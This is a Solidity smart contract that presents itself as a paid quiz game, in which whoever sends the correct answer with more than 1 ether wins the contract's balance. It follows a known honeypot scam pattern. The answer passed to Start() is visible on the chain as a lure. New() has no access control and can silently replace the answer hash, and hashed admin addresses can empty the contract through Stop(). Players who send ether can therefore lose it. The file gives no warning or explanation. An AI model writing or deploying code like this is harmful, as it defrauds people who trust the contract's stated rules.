// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Quiz {
    string public question;
    bytes32 responseHash;
    mapping (bytes32=>bool) admin;

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function Try(string memory _response) external payable 
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(abi.encodePacked(_response)) && msg.value > 1 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    function Start(string memory _question, string memory _response) public payable {
        if(responseHash==0x0){
            responseHash = keccak256(abi.encodePacked(_response));
            question = _question;
        }
    }
    function Stop() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
    }

    function New(string memory _question, bytes32 _responseHash) public payable  {
        question = _question;
        responseHash = _responseHash;
    }

    constructor(bytes32[] memory admins) public payable{
        for(uint256 i=0; i< admins.length; i++){
            admin[admins[i]] = true;        
        }       
    }
    modifier isAdmin(){        
        require(admin[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

}